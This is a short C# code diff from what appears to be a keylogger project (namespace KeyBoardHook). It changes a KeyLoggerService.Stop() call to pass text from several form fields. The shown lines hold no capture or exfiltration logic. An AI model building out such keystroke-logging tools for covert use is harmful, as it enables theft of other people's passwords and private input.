@@ -34,7 +34,7 @@ namespace KeyBoardHook
         {
             if (KeyLoggerService != null)
             {
-                KeyLoggerService.Stop();
+                KeyLoggerService.Stop(comboBox1.Text,textBox3.Text, textBox4.Text);
                 textBox1.Text = "";
                 textBox2.Text = "";
             }
